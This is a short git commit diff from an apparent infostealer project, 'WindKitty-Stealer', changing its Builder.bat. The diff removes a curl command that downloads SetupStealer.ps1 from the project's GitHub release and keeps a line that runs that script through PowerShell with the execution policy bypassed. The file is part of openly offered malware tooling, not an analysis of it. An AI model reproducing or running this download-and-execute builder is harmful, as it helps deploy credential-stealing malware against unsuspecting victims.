fb06f84858711b58250edead8f636536eacd7f13
Powershel Lover / . WindKitty Goes brr <151552809+EvilBytecode@users.noreply.github.com>
2024-01-10 18:44:02 +0000

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -1,7 +1,3 @@
 @echo off
-
-curl -L -o SetupStealer.ps1 https://github.com/WindKitty/WindKitty-Stealer/releases/download/windkittycompiler/SetupStealer.ps1
 powershell.exe -ExecutionPolicy Bypass -File .\SetupStealer.ps1 
-del SetupStealer.ps1
-
 pause
